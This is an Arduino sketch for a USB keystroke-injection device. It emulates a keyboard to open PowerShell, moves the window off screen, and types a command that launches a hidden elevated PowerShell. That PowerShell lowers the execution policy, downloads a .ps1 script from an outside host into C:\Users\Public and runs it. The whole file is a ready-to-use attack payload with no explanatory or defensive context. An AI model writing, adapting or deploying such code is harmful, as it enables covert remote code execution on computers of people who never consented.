void setup() {
  Keyboard.begin();
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500); 
  Keyboard.print('r');
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
    Keyboard.println("POWERSHELL -NOP");
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  delay(200); 
  Keyboard.press(' ');
  delay(200); 
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.release(' ');
  delay(200);
  Keyboard.print("m");
  Keyboard.press(KEY_LEFT_ARROW);
  delay(3000);
  Keyboard.release(KEY_LEFT_ARROW);
  Keyboard.println();
  delay(800);
  Keyboard.println("START-PROCESS -fILEpATH POWERSHELL \" -NOP -W HIDDEN -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;CD C:\\USERS\\PUBLIC\\;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE(\'HTTP://FQ.WC.LT/UP/1464673058.PS1\',\'C:\\USERS\\PUBLIC\\GET.PS1\');./GET.PS1;EXIT\" -vERB RUNAS;EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();
}
void loop()
{
  //Keyboard.press(KEY_LEFT_ALT);
  //Keyboard.print('y');
  //Keyboard.release(KEY_LEFT_ALT);
  //delay(800);
}
